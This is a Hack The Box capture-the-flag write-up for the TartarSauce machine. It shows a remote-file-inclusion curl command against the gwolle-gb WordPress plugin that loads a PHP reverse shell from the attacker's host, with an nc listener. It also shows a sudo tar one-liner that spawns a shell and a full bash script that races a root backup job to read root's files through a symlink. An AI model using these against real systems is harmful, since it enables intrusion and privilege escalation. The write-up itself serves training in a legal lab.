# TartarSauce [HTB](https://app.hackthebox.com/machines/138)
![tartarsauce-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/TartarSauce/img/tartarsauce-01.png)


## Recon 

After adding the target to my `/etc/hosts` file I start scanning for open ports:

```bash
nmap -p- --min-rate 10000 tartarsauce.htb
```

![ports-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/TartarSauce/img/ports-02.png)


We have a single port, let's run a version detection scan:

```bash
nmap -p 80 -sCV tartarsauce.htb -oN nmap.result
```

![nmap-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/TartarSauce/img/nmap-res-03.png)


We can see we have an Apache/2.4.18 server on port 80, let's take a closer look at it. 



### Apache Port 80

Based on the `nmap` probing script, we can notice the presence of a `robots.txt` file which restricts access to several directories inside the `/webservices` directory. One of these directories is `/phpmyadmin/`, so we can probably guess that the site is powered by php.


Before we check the directories present in `robots.txt`, let's start by taking a look at the main page of the site at `http://tartarsauce.htb/`:

![site-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/TartarSauce/img/site-04.png)


We see some ASCII art, which is pretty cool, but nothing to do here. Let's try to access the directories listed in `robots.txt`:

+ `/webservices` 

If we try to access this directory, we get a `403` forbidden error:

![err-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/TartarSauce/img/err-05.png)


+ `/tar/tar/source/`, `/developmental/`, `/phpmyadmin/`, `/phpmyadmin/`

Don't exists, all return a `404` resposne. 


+ `/webservices/monstra-3.0.4` 

[Monstra](https://monstra.org/) is an open source CMS written primarly in php. It has been deprecated for quite some time, and we can find the source code on they're [Github](https://github.com/monstra-cms/monstra).


Trying to access the `/webservices/monstra-3.0.4/` directory does work:

![monstra-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/TartarSauce/img/monstra-06.png)


If we do a quick google search for `monstra-3.0.4`, we will find that this version is vulnerable to an authinticated [RCE vulnerability](https://www.exploit-db.com/exploits/49949). In short, monstra has a file upload feature which forgets to exclude file extensions like `.pht` or `.phar`, which allows authinticated admins to upload a reverse shell. 


If we scroll down a bit, we will see a link to the admin panel at `/webservices/monstra-3.0.4/admin/`:

![admin-panel-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/TartarSauce/img/admin-panel-07.png)


The question is how do we get into the admin panel? 


I started by looking for default credentials online which lead me to another vulnerability in the `monstra` CMS, which is [credentials disclosure](https://www.exploit-db.com/exploits/39567) for un-authenticated users. 


The `monstra` CMS stores the user database in `/storage/database/users.table.xml`, which is readable world-wide:

![table-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/TartarSauce/img/table-08.png)


We can see an entry for the `admin` user, the password value looks hashed. From my research online, the `monstra` cms uses a salted MD5 hash to store passwords, but upon [identifying](https://hashes.com/en/tools/hash_identifier) the found hash we can see it's simply an MD5 hash:

![md5-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/TartarSauce/img/md5-09.png)


Unfortenatly, trying to crack it with `hashcat` doesn't work. 


While I was still researching other methods of cracking the hash, I ran a directory and file scan on the `/webservices` directory using:

```bash
ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://tartarsauce.htb/webservices/FUZZ -e .cgi,.txt,.xml,.html,.php
```

![ffuf-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/TartarSauce/img/fuf-10.png)


It looks like we have a WordPress site here as well! 


### WordPress

Let's check it out at `http://tartarsauce.htb/webservices/wp/`:

![wp-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/TartarSauce/img/wp-11.png)


There are a few ways to enumerate WordPress sites, but I decided to start with `wpscan`:

```bash
wpscan --url http://10.129.1.185/webservices/wp/ --enumerate ap,at,u --plugins-detection aggressive
```

This resulted in a few interesting results, for example we can see we have the `xmlrpc` API endpoint enabled:

![xmlrpc-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/TartarSauce/img/xmlrpc-12.png)


It's possible to leverage this API to [brute force login credentials](https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/), however if we continue down to the plugins found on the target, we will see the following:

![protect-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/TartarSauce/img/protect-13.png)


There is a plugin that prevent these sorts of attacks. There were also two more plugins found on the target:

+ akismet

![akismet-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/TartarSauce/img/akismet-14.png)

I searched online for any known exploits for this plugin, but the best I could find is an [XSS exploit](https://www.exploit-db.com/exploits/37902). 

Not super relevant for a CTF. 


+ gwolle-db

![gwolle-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/TartarSauce/img/gwolle-15.png)


The `wpscan` scan found that the version of the `gwolle-db` plugin is `4.6.1`, but if we take a look at the `readme.txt` file we will see the following:

![readme-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/TartarSauce/img/readme-16w.png)


The creator of this box is trolling us, the real version of this plugin is actually `1.5.3`. If we search online, we will find a Remote File Inclusion [vulnerability](https://www.exploit-db.com/exploits/38861) for this version, also known as `CVE-2015-8351`.


Based on this vulnerability an un-authinticated attacker can abuse the `abspath` parameter to include remote php files. This can be achived with a simple GET request. 


To exploit this we can use [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell)'s php reverse shell script. 


After downloding the script to my attack machine, I update my local listener settings:

![update-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/TartarSauce/img/updatre-17.png)


Next, I start the local listener with:

```bash
rlwrap nc -lnvp 9001
```

After that I start a local Python web server to host the malicious reverse shell:

```bash
python3 -m http.server 80
```

And execute with:

```bash
curl -s http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.58/	# the plugin auto-completes the filename to wp-load.php
```

Which gives me a shell:

![shell-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/TartarSauce/img/shell-18.png)


## Privilege Escalation


After exploiting the WordPress plugin we get a shell as the `www-data` service account on the system, but there is also a regular user account named `onuma`:

![unuma-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/TartarSauce/img/onuma-19.png)


As we can see, we don't have any permissions to `onuma`'a home folder, so let's start with system enumeration.


If we go back to the output of `uname -a` we will note that the kernel version here is a bit outdated:

![uname-20](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/TartarSauce/img/uname-20.png)


If we lookup exploits for this kernel version we can find a [few](https://www.exploit-db.com/exploits/47163), but unfortunately, we dont have a compiler on this box:

![gcc-21](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/TartarSauce/img/gcc-21.png)


And at any case, it's best to leave kernel exploits as a last resort. 


Instead, I decided to hunt for easy wins, like any `sudo` permissions:

![sudo-22](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/TartarSauce/img/sudo-22.png)


We can see that the `www-data` user can run `tar` as the `onuma` user. 


To exploit this we can use a one-liner as described in [GTFObins](https://gtfobins.github.io/gtfobins/tar/#sudo) with:

```bash
sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

![onuma-23](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/TartarSauce/img/onuma-23.png)


### Onuma 

After spwaning a shell as `onuma`, I tried to list `sudo` permissions once again, but we get prompted for credentials which we don't have. 


So instead I decided to have a look around the user's home folder:

![home-24](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/TartarSauce/img/home-24.png)


There are some unusual files here, but nothing super useful. 


At this point I decided to take a look at processes that run as root with `ps auxww | grep root`:

![ps-25](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/TartarSauce/img/ps-25.png)


This looks like a custom background task rather then a normal system process. I checked the `/etc/crontab` file but nothing there. So I decided to examine this `backuperer` program:


![locate-26](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/TartarSauce/img/locate-26.jpg.png)


Looks like it's a systemd-timer, as well as a startup service. If we examine what type of program this is we will see it's a simple shell script:

![file-27](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/TartarSauce/img/file-27.png)


It appeas that everyone can read the script:

![perms-28](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/TartarSauce/img/perms-28.png)


Here is the breakdown of the script:

+ Define vartiables:

![vars-29](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/TartarSauce/img/vars-29.png)

+ Delete any hidden files inside `/var/tmp/.*`, and the `/var/tmp/check` directory recursively.

![del-30](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/TartarSauce/img/del-30.png)

+ Backup the entire `/var/www/html` directory and save that as a hidden file, named with a random sha-1 digest. 

![backup-31](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/TartarSauce/img/backup-31.png)

+ Sleep for 30 seconds:

![sleep-31.5](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/TartarSauce/img/sleep-31.5.png)

+ Create a temporary directory of `/var/tmp/check`, to which extract the archive from the previous step. 

![mkdir-32](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/TartarSauce/img/mkdir-32.png)

+ Recursively compare the freshly extracted files inside `/var/tmp/check` with the original files at `/var/www/html` via the `diff` command, which is done via a function:

![func-33](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/TartarSauce/img/func-33.png)

That's executed here:

![exec-34](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/TartarSauce/img/exec-34.png)


+ If any differences are found, write them to `/var/backups/onuma_backup_error.txt` and terminate the script with an exit code of 2.


+ If no differences were found, rename the random sha-1 archive and save it as `/var/backups/onuma-www-dev.bak`, and remove the `/var/tmp/check` directory and any hidden files.
 

![if-35](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/TartarSauce/img/if-35.png)


Let's try to make sense of this. 


The first thing the script does is remove anything that matches the `/var/tmp/.*` glob, and the enitre `/var/tmp/check` directory recursively, Why? 


Because these objects might still exsits on the system based on the result of the `diff` command in the previous execution of the script. If `diff` found a difference then the script terminates without deleting the files. Therefore, the first thing the script does when it launches is delete these files/folders if they exsits.


Then it creates an archvie of the enitre `/var/www/html` directory recursively, this is where the WordPress and Monstra CMS's are found. This archive will be named with a dot followed by a random sha-1 digest.


After this the script sleeps for 30 seconds. Only to then create the `/var/tmp/check` directory once again, and extarct what was just archived from `/var/www/thml` into it. 


At this point the script uses the `diff` program to compare the freshly extracted archive with the files present inside `/var/www/html`. If they don't match, then the output of the `diff` command is written into a log file and the script terminates, leaving all of the `/var/tmp/check` directory and the `.<sha-1-digest>` archive in place. If the files do match, then the script writes the backup archive into a final file, and cleans up after itself. 


This eniter process runs every 5 minutes:

![timer-36](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/TartarSauce/img/timer-36.png)


How do we exploit this to get a shell as root? The short answer is we don't.


The main issue with this script is the fact that root is extracting an archive inside a directory that is writable by low-privilege users. This allows for the creation of files on the system on behalf of root. To understand why, we need to keep one concept in mind:


Tar will always strive to preserve the original UID/GID of the files inside an archvie when it's being extracted. 


Because low-privilege user's can't change the UID/GID of files that they don't own, when a low-privilege user extract's an archive, tar will modify the file's UID/GID to match thoes of the extracting low-privilge user. But root can change UID/GID at will, therefore, when root extracts an archive, the UID/GID of the original file will be preserved.  


This simple concept opens up a big security risk:


If we create files on our attack machine as root and place them into an archive, the UID/GID of the files inside the archive will be that of root. *And if this archive get's extracted on a different machine as root, the files UID/GID will be presereved*. 


Which in essence, *allows us to create files as root on a remote machine through tar archvies*, just as long as root is the one extracting the archive on the remote machine, and we can write to whatever directory is being used for the extraction.


So to exploit this machine we need to create a suid C program on our attack machine as root, give it the SUIG bit permission, archive it, and transfer this over to the target machine. Then, in that 30 second sleep window, replace the archive created by the script with our own, and wait for root to extract our own malicious archive, along with the SUID binary, with all of it's permissions and ownership preserved, giving us a suid binary to pop a shell as root on the target. 


Why doens't this work? 


Because at the time of writing this, at the end of 2023, if we compile the suid binary on a modern Linux machine, it wont be able to run on the target machine due to compatibility issues with the C interpreter. 


Simply put, the target won't be able to run a binary compiled on a modern Linux system. 


The only way to bypass this issue that I can think of, is to create a new virtual machine, with an older version of `gcc` that will be able to compile a program in a manner that will fit the C intepreter on the target system. I'm not going to do that here. 


Instead, we can exploit a different issue of the `backuperer` script to read arbitrary files as root:


If we think about it, the script simply copies the files at `/vat/www/html`, waits for 30 seconds, then pasts the files into `/var/tmp/check`, and checks if they are still the same using `diff`. 


If they are not the same, the script will write the output of the `diff` command onto a log file at `/var/backups/onuma_backup_error.txt`. The output of the `diff` command will display the contents of the files at the positions at which the files differ. 


So we can leverage the 30 second wait period to replace the original archive created by the script with our own variant which has a symbolik link from `/var/www/html/robots.txt` -> `/root/root.txt`.  


This will cause the `diff` command to identify the difference (`/root/root.txt` != `/var/www/html/robots.txt`) and output the contnets of the root flag onto the log file at `/var/backups/onuma_backup_error.txt`. Essentially giving us arbitrary read access as root via the script. 


To exploit this we can use the following bash script:

```bash
#!/bin/bash

# work out of shm
cd /dev/shm

# set both start and cur equal to any backup file if it's there
start=$(find /var/tmp -maxdepth 1 -type f -name ".*")
cur=$(find /var/tmp -maxdepth 1 -type f -name ".*")

# loop until there's a change in cur
echo "Waiting for archive filename to change..."
while [ "$start" == "$cur" -o "$cur" == "" ] ; do
    sleep 10;
    cur=$(find /var/tmp -maxdepth 1 -type f -name ".*");
done

# Grab a copy of the archive
echo "File changed... copying here"
cp $cur .

# get filename
fn=$(echo $cur | cut -d'/' -f4)

# extract archive
tar -zxf $fn

# remove robots.txt and replace it with link to root.txt
rm var/www/html/robots.txt
ln -s /root/root.txt var/www/html/robots.txt

# remove old archive
rm $fn

# create new archive
tar czf $fn var

# put it back, and clean up
mv $fn $cur
rm $fn
rm -rf var

# wait for results
echo "Waiting for new logs..."
tail -f /var/backups/onuma_backup_error.txt
```

We simply need to trasnfer this over to the target and run it to get the `root.txt` flag:

![root-37](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/TartarSauce/img/root-37.png)
